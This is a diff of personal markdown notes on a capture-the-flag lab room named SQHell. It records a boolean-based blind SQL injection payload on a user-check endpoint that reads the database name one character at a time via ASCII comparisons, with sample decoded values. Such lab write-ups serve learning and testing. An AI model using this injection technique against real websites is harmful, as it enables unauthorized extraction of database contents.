@@ -9,8 +9,7 @@ tags:
 ## flag 4:
 ## flag 5:
 
-
-
+ 
 ## boolean based SQLi on `/register/user-check?username=admin`: 
 - request:
 ```
@@ -40,15 +39,6 @@ Content-Length: 19
 ```
 GET /register/user-check?username=admin' AND (ascii(substr((select database()),Data_offset,1))) = 'ascii values'--+
 ```
-
-sqhell 
-offset 1,1
-s = 115
-
-115 = s
-113 = q
-104 = h
-101 = e
 
 - burp setup:<br>
 ![[SQHell burp1.png]]<br>
